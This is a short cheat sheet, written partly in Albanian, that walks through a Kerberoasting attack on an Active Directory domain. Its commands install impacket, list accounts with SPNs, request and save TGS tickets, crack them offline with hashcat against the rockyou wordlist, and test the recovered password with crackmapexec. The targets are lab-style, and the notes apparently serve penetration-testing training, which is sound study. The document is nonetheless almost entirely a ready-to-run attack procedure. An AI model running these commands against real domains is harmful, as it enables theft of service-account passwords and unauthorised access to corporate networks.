### 🎯 **Qëllimi:**

Të bësh **Kerberoasting**, që është një teknikë për të marrë bileta TGS për shërbime që kanë SPN dhe t’i përdorësh për të zbuluar fjalëkalimet e përdoruesve në domain.

```bash
# Install impacket tools
git clone <https://github.com/fortra/impacket>
cd impacket
sudo python3 -m pip install .

# ➜ Tregon përdoruesit që kanë SPN (target për Kerberoasting)
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/<user>

# # ➜ Merr biletat TGS që mund të crack-ohen offline
GetUserSPNs.py -dc-ip 172.16.5.5 <domain>/<user> -request 

# Requesting a Single TGS ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user <target>

# Saving the TGS Ticket to an Output File
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user <target> -outputfile sqldev_tgs

# Cracking the Ticket Offline with Hashcat
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt

# Testing Authentication against a Domain Controller
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```